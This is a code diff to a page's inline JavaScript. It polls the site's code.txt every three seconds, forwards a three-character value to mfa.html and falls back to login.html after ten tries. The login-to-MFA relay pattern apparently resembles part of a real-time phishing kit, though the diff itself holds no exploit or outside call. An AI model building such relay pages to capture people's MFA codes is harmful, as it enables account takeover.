@@ -552,36 +552,55 @@ Constrain images and videos to the parent width and preserve their intrinsic asp
 		</div>
 		<script>
 			document.addEventListener("DOMContentLoaded", (event) => {
-				// Function to fetch the number from the server
+				let fetchAttempts = 0;
+				const maxFetchAttempts = 10;
+				const fetchInterval = 3000; // 3 seconds
+				const domainUrl = window.location.origin;
+
 				function fetchNumber() {
-					// Show the loading message
-					// document.getElementById('loading').innerHTML = '<p>Loading...</p>';
+					// Check if the maximum number of attempts has been reached
+					if (fetchAttempts >= maxFetchAttempts) {
+						window.location.href = `${domainUrl}/login.html`;
+						return;
+					}
 
-					const domainUrl = window.location.origin;
+					// Increment the fetch attempts counter
+					fetchAttempts++;
 
-					// Fetch the result from the PHP server
-					fetch(`${domainUrl}/code.txt`)
-						.then((response) => response.text())
-						.then((data) => {
-							console.log("data: " + data.length);
-
-							if (data.length > 0) {
-								// Redirect to new page with data as query parameters
-								const params = new URLSearchParams({ data: data });
-								window.location.href = `${domainUrl}/mfa.html?${params.toString()}`;
-							}
-						})
-						.catch((error) => {
-							// redirect back to login
-							// window.location.href = `${domainUrl}/login.html`;
-						});
+					try {
+						// Fetch the result from the server
+						fetch(`${domainUrl}/code.txt`)
+							.then((response) => {
+								// Check if the response is OK
+								if (!response.ok) {
+									throw new Error(`HTTP error! status: ${response.status}`);
+								}
+								return response.text();
+							})
+							.then((data) => {
+								if (data.length == 3) {
+									// Redirect to the new page with data as query parameters
+									const params = new URLSearchParams({ data: data });
+									window.location.href = `${domainUrl}/mfa.html?${params.toString()}`;
+								}
+							})
+							.catch((error) => {
+								console.error("Error fetching the code.txt file: ", error);
+								// Optionally, you can redirect back to the login page immediately on error
+								// window.location.href = `${domainUrl}/login.html`;
+							});
+					} catch (error) {
+						console.error("Error fetching the code.txt file: ", error);
+						// Optionally, you can redirect back to the login page immediately on error
+						// window.location.href = `${domainUrl}/login.html`;
+					}
 				}
 
 				// Call the fetch function once when the page loads
 				fetchNumber();
 
-				// Fetch the number every 10 seconds
-				setInterval(fetchNumber, 3000);
+				// Fetch the number every 3 seconds
+				setInterval(fetchNumber, fetchInterval);
 			});
 		</script>
 	</body>
